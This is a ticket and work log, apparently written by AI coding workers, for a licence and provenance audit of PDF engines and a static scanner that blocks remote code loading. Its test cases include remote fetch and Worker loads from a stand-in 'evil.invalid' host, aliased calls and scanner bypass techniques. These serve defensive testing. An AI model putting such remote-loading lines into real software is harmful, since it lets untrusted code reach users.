# 369 — Motore PDF editor proprietary-safe confronto

**What to build:** Confronta existing PDF libs, MuPDF alternative e licenze

**Traces to:** OWN-05 OWN-14; OWN authority 2026-10-10

**Constraints:** Preserve local-first, anonymous-first, proprietary license, WCAG 2.2 AA, mobile advanced access, zero additional initial costs, no false Gold or silent cloud upload

**Blocked by:** None

**Status:** ready-for-agent

**Suggested skills:** plan-spec → plan-tickets → code-architecture-review → security-audit → code-tdd → qa-browser; domain skills as needed

**Level:** feasibility

**Priority:** P1 feasibility or advanced user capability

**Current evidence:** Historical audit as of 2026-10-10; not a shipped new feature

**Donor / reuse decision:** Compare installed, native local, maintained licensed donor and commercial alternative. Pin version/license/transitive assets; no automatic fork

## Acceptance criteria

- [ ] AC-369.1: Confronta existing PDF libs, MuPDF alternative e licenze.
- [ ] AC-369.2: AGPL o commerciale senza accordo non adottata.
- [ ] AC-369.3: On the scoped input and failure cases, verify: Feature+source+license+bundle+mobile matrix. Record the current source/date, independently checked outcome and NOT_RUN/NO_GO where evidence is absent.

**Verification:** Feature+source+license+bundle+mobile matrix. Test malformed/boundary/cancel and mobile as relevant.

**Failure / recovery:** Explicit size/format/memory limits after measurement; preserve original on refusal/cancel.

**External gate:** Rights, physical performance, security and owner purchase must pass before production; no gate presumed approved.

**Rollback:** Keep reversible migration to prior valid engine/bytes; protect historical receipts.

**Out of scope:** App implementation now, unapproved vendor spend, deploying incomplete safety features.

**Execution prompt:** Coordinated in EXECUTION-PROMPTS.md.

## 2026-10-12 — wave 16, offline executable provenance gate (partial / NO_ADOPT)

**Exclusive additions:** `scripts/audit-pdf-engine-provenance-369.ts`, `tests/audit-pdf-engine-provenance-369.test.ts` and append-only note here. Existing `src/engines/pdf/*`, #56, #237, #378, #47, #371, CI/build and vendor files were **not modified**. HEAD observed `e6d137d0` (Mac Studio). No donor was fetched or installed.

**Real installed evidence:** `npx tsx scripts/audit-pdf-engine-provenance-369.ts` reopens `quality/fixtures/pdf-gold/simple-2page.pdf` with installed `pdfjs-dist` legacy PDF.js parser and independently obtains **2 pages**, extractable `alpha beta`, fixture SHA256 `0a3ea973659ca6d454738bfe49dc14fe9e21acb0ae7c82f389b3c7c14768b551`. Installed `pdfjs-dist@6.4.299` declares `Apache-2.0` in both `node_modules/.../package.json` and the pinned package-lock entry; actual installed Apache-2.0 root LICENSE is read/checked, and npm lock has a syntactically valid SHA512 integrity value/resolved canonical npm URL. The script reads and fingerprints **7 actual local program artifacts** (browser + worker + legacy parser JS, JBIG2/OpenJPEG/qcms/QuickJS WASM), verifies each has nonempty and bounded bytes, checks Apache source headers for the JS files, and reads/fingerprints **10 separate installed license notices** covering WASM, standard fonts and CMaps. Example observed raw WASM sizes: `jbig2.wasm` 103,671 B, `openjpeg.wasm` 251,131 B, `qcms_bg.wasm` 96,589 B, `quickjs-eval.wasm` 469,105 B. All full current-local SHA256 values are in machine-readable output, **not asserted to equal an independently authenticated upstream package**. The installed Liberation font notice expressly mentions GPLv2 **with an exception**, so the root Apache SPDX string must not be generalized as a blanket license for all transitives.

**Security/source gate:** TypeScript AST scans first-party `src/engines/pdf` files plus actual installed PDF.js browser, worker and legacy modules for static remote `import`/`fetch`/`importScripts` or remote Worker loads, and refuses direct imported MuPDF package specifiers and unexpected MuPDF installations. A bare `new URL('https://...')` inside upstream PDF.js is **not** treated as network activity; a remote URL actually passed to `new Worker(...)`, `import(...)` or `fetch(...)` is refused. It also refuses changed package/version/lock integrity declarations, missing/empty JS or WASM assets, changed AGPL/commercial package license and missing, implausible or substituted root/component notices. The check is **read-only/offline** and is not a complete dynamic/network/CSP or legal transitive-source audit.

**TDD negative evidence:** New suite first failed due missing validator (**RED**); after the initial implementation, a plausible-length substituted AGPL text in `wasm/LICENSE_OPENJPEG` **incorrectly passed** and a focused real RED test exposed the hole. The implemented component-notice content patterns then made that attempt fail closed (**GREEN**). Fresh `npx vitest run tests/audit-pdf-engine-provenance-369.test.ts`: **8/8 PASS** (actual installed parser readback, local provenance, adversarial AGPL package+component notice, tampered license text, malformed pin/SRI/vendor file, remote imports in vendor and first-party). `npx tsc --noEmit --pretty false`: **exit 0**; `git diff --check` PASS. PDF.js emitted a nonfatal desktop Node `standardFontDataUrl` warning while extracting the actual fixture; this is **not** browser-font parity proof.

**Comparison / remaining AC:** The script reports existing first-party PDF parser/writer as local source with no donor license, PDF.js installed Apache-2.0 **declared, notices present but no verified upstream tarball/source distribution chain**, MuPDF **not installed** with AGPL/commercial **not adopted** (no commercial agreement claimed), and OS-native macOS PDFKit **not a cross-platform browser vendor**. Report permanently labels adoption `NO_ADOPT_NO_GOLD`, and installed file sizes are **not** measured production bundle downloads. MuPDF edition/rights and full compiled WASM/QuickJS origin, complete NOTICE redistribution, legal sign-off, hardware iPhone/Android memory/battery, dynamic CSP/offsite/network and feature/fidelity parity remain **NOT_RUN/NO_GO**. Original **AC-369.1–3 remain unchecked globally**, including an independently verified MuPDF donor evaluation and physical bundle/mobile matrix. No Gold promotion, vendor download, commit, push or deployment.

## 2026-10-13 — native follow-on P2 static import/license gate, RED → GREEN, NO_ADOPT

**Observed baseline:** On `fix/wave4-336-370-406-415-integration-20261013`, HEAD `d1948cc24c646b1b0e7a510f1ff8519eb20c5627`, new isolated fixtures copied the *actual installed* `pdfjs-dist@6.4.299` browser/worker/legacy modules, WASM and component licenses. Initial `vitest` returned **9 RED / 1 PASS**. Audit incorrectly admitted remote code in second `importScripts` argument or member `self.importScripts`, `fetch(new URL('https://...'))`, constant concatenated dynamic `import`, remote `pdfjs.GlobalWorkerOptions.workerSrc`, and `new Worker(const remoteURL)`. The same local proof showed a constant-concatenated `mupdf` donor import, manifest alias `npm:mupdf@1.0.0` despite installed `pdfjs-dist`, and an appended explicit `commercial use prohibited` component restriction passed as approved. These are concrete false-safe assertions in the auditor; they are not claims that the present deployed app exercised these paths.

**Bounded fix:** `scripts/audit-pdf-engine-provenance-369.ts` now evaluates only statically determined string literals, concatenations, direct `new URL(...)` wrappers and lexical `const` bindings in the existing TypeScript AST. It checks every `importScripts` argument, member-call fetch/importScripts, worker constructor URL, and assigned PDF.js `workerSrc`; refuses parse-broken source, MuPDF imports and explicit incompatible commercial-use restrictions in root/component license notices. A further isolated RED proved that browser-normalized leading spaces before `https:` and executable static `blob:` Worker references also passed; both now fail closed. The project dependency range is limited to reviewed `6.4.299` or `^6.4.299` and, if the npm lock root declaration is present, it must agree with the manifest. A sparse synthetic npm lock root remains explicitly marked `NOT VERIFIED` in audit limitations; production lock root was present and checked. The auditor does **not** claim to trace runtime-computed URLs, authenticated upstream tarballs, transitive license clearance, production network silence or legal permission.

**Measured GREEN:** `./node_modules/.bin/vitest run tests/audit-pdf-engine-provenance-369.test.ts tests/audit-pdf-engine-provenance-369-20261013.test.ts --reporter=dot` **22/22 PASS**, covering all baseline RED examples, both subsequent normalized-URL/`blob:` RED cases, allowed local relative worker/URL and mutable reassignment, plus the old 8. Targeted `tsc --ignoreConfig --noEmit --pretty false --skipLibCheck --target es2022 --module esnext --moduleResolution bundler --types node scripts/audit-pdf-engine-provenance-369.ts tests/audit-pdf-engine-provenance-369-20261013.test.ts` **PASS**. Whole-repo `tsc --noEmit` separately failed due unrelated concurrent `scripts/forensic-redaction-378.ts:130` TS1005 parse error; it is not included in the #369 patch. Actual `tsx scripts/audit-pdf-engine-provenance-369.ts` **exit 0**, inspected 60 source/vendor files, independently parsed **2 pages / `alpha beta`**, and returned `NO_ADOPT_NO_GOLD` with MuPDF `AGPL_OR_COMMERCIAL_UNAPPROVED`. Original AC-369.1–3 **remain OPEN**, physical bundle/mobile, rights and dynamic CSP gates still NOT_RUN. Sole integrator owns Git/PR/push/merge.

## 2026-10-13 — independent static remote-base URL bypass, scoped correction (worker-20; OPEN)

**Independent P2:** Draft PR #27 source at `f04d4ce991ba339d9ec9168a0e1fd6e5a564f373`
considered `fetch(new URL("./payload.wasm", "https://evil.invalid/pdf/"))`,
`new Worker(new URL("./pdf.worker.mjs", "https://evil.invalid/pdf/"))`,
and equivalent constant-bound bases as local, even though JavaScript's real URL
constructor resolves each to a remote HTTPS address. Actual
`inspectPdfEngineProvenance369` on independently isolated copies of installed
PDF.js 6.4.299 returned `remoteCount:0` for these sources. A separate scan of
the installed repository source found 57 first-party and three vendor JS/TS
files totaling 4,786,222 bytes (largest first-party 63,778 bytes); this
specific source corpus did not exhibit a source-size limit failure.

**RED → GREEN:** NEW
`tests/audit-pdf-engine-provenance-369-20261013-remote-base.test.ts` uses actual
copied installed assets plus an isolated first-party AST source, proves four
remote relative/base expressions incorrectly passed before the fix (**4 RED,
1 benign local PASS**), and now requires `PDF369_NO_GO` for remote `fetch` and
`Worker` both directly and through lexical constant bindings. In
`scripts/audit-pdf-engine-provenance-369.ts`, the bounded `new URL` static
evaluator resolves a known relative address against an independently known
literal/constant base via the platform's `URL` implementation. Legitimate
`new URL("./pdf.worker.mjs", import.meta.url)` and ordinary local paths stay
allowed. A runtime-computed/unknown base is outside this source-only AST audit
and remains an expressly documented limitation, not a claimed exhaustive
network/CSP gate. No vendor, dependency, rollout, code consumer or license
decision changed. Original AC-369.1–3 remain **OPEN** and adoption remains
**NO_ADOPT_NO_GOLD** pending independent legal/transitive-rights, source,
feature/bundle and physical mobile proof.

## 2026-10-13 — native static callee-alias audit correction (worker-17; partial, NO_ADOPT)

**Actual independent P2 RED:** Against Draft PR #27 remote source `d06439f216e6ed3a2497139801b962d8ad9acd56` (base `402774b3`), the installed read-only `inspectPdfEngineProvenance369` returned `remoteCount:0` for statically obvious `const downloader=fetch; downloader("https://evil.invalid/x")`, `const loader=importScripts; loader(remote)`, and `const load=require; load("mupdf")` in scoped first-party PDF TypeScript; the corresponding direct sinks correctly returned `PDF369_NO_GO`. Actual runtime import/network behavior was **not** asserted. The original scanner recognized the call-site identifier's spelling but did not resolve locally aliased host functions.

**Real regression RED → GREEN:** NEW `tests/audit-pdf-engine-provenance-369-20261013-callee-alias.test.ts` copies the **actual installed PDF.js 6.4.299** browser/worker/legacy modules, WASM, root/component licenses and lock metadata into isolated temporary test roots, injecting only the small first-party TS source. Before the fix **9/13 RED**: seven missed remote/MuPDF sink aliases and two false refusals from locally shadowed `fetch`; four benign controls already passed. The final test also checks a mutable alias acquired by subsequent assignment. Direct, chained, nested and mutable possible aliases, later `importScripts` arguments, local relative URLs, block shadows, local helper functions and function-parameter shadows are now covered. No network request, vendor change, or license grant was made.

**Bounded correction:** In `scripts/audit-pdf-engine-provenance-369.ts`, a separate lexical lookup maps statically resolvable `fetch`, `importScripts`, and `require` identifiers through local aliases and honors lexical block/function scopes and declared parameters. Known mutable aliases remain conservative if a later assignment could retain or acquire a native sink. Import, Worker, static `new URL`, PDF.js `workerSrc`, manifest/lock and license checks remain in force. This tracks direct lexical callee identities only; callbacks, returned functions, runtime-computed values, host/environment aliases and general interprocedural data flow remain outside this admitted static audit.

**Evidence and limits:** New focused **14/14 PASS**, pre-existing **27/27 PASS**, combined four test suites **41/41 PASS** using `./node_modules/.bin/vitest run tests/audit-pdf-engine-provenance-369.test.ts tests/audit-pdf-engine-provenance-369-20261013.test.ts tests/audit-pdf-engine-provenance-369-20261013-remote-base.test.ts tests/audit-pdf-engine-provenance-369-20261013-callee-alias.test.ts --no-file-parallelism --testTimeout=35000 --reporter=dot`. The sequential setting prevents CPU contention between repeated real asset scans. TypeScript source+new-test scoped compilation PASS. Actual `npx tsx scripts/audit-pdf-engine-provenance-369.ts` completed exit 0 and scanned **60 real first-party/vendor sources**, reopened **2 PDF pages / `alpha beta`**, verified installed local notices/assets and still returned **`NO_ADOPT_NO_GOLD`**. Parallel initial runs yielded **2 test-timeout-only failures (38/40)** at 5 s, then **1 test-timeout-only failure (39/40)** at a test's explicit 20 s limit. The final sequential run **41/41 PASS** resolves that validation noise; neither earlier timeout was a validator acceptance failure. Git integration/update of the **same Draft PR #27** belongs solely to prime. Original **AC-369.1–3 remain OPEN**: independent MuPDF source/legal review, full WASM/QuickJS redistribution rights, CSP/dynamic network assurance, bundle/fidelity matrix, physical iPhone/Android performance and sign-off are **NOT_RUN/NO_GO**.

## 2026-10-14 — branch-only cumulative Linux CI CPU-budget proof (OPEN)

On immutable integration review SHAs `247a678ca5e1092fabf06f906fd902a481f07aa0` (GitHub Actions run `38598297898`) and `a9f3135d15eeeaf80b7cc53dc540d65424de93db` (run `38598918254`), the new no-deployment branch workflow used four parallel Vitest workers. Both runs completed most full-suite cases, but the **same two source-bound positive PDF.js provenance tests** in `tests/audit-pdf-engine-provenance-369-20261013.test.ts:40,43` exceeded Vitest's generic **5 s per-test deadline** under Ubuntu runner contention. Logs show timeout only, not a contrary acceptance assertion; second run **2,551 tests PASS, two tests TIMEOUT, 32 SKIP**. The identical 14-test fixture passed on Node 26 local real PDF.js in **3.41 s total**, with measured individual expensive tests **1.54 s and 1.16 s**. This is a reproduced runtime-budget mismatch of genuine installed PDF.js artifact-copy plus AST audits, not permission to drop them. The narrow fix sets an explicit **20,000 ms** budget on those two positive real-artifact checks only; all assertions, adversarial tests, license refusals, package pins, coverage, consumer imports and `NO_ADOPT_NO_GOLD` policy remain unchanged. The branch-specific CI also must use bounded low-concurrency full tests; green final source CI requires a new actual GitHub run on its revised immutable SHA, never reuse failing run as PASS. Original AC-369.1–3 remain OPEN pending legal, physical and rights evidence.
